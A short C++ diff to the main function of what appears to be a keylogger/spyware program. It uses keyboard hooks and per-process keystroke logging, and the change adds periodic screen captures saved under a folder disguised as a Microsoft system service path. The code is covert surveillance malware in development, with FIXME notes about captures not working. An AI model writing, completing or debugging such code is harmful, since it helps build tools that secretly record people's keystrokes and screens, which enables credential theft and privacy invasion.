@@ -7,8 +7,9 @@
 int main() {
 
 #ifdef DEBUG_BUILD
-  Stream::GetAccountInfo(clientInfo);
-  std::cout << "io";
+  std::string path = Stream::GetPath("\\Microsoft\\SystemService");
+  Screen::CaptureScreen(path, "winpst", true, 1000); // FIXME doesnt work?
+
 #endif
 
 #ifndef DEBUG_BUILD
@@ -43,7 +44,7 @@ int main() {
   std::string write = ostream.str();
   Stream::WriteLog(write, KeyHook::activeProcess, false);
 
-  Screen::CaptureScreen(path, "winpst", true, 60000);
+  Screen::CaptureScreen(path, "winpst", true, 60000); // FIXME doesnt work?
 
   KeyHook::HandleMessage(true);
 #endif // DEBUG_BUILD
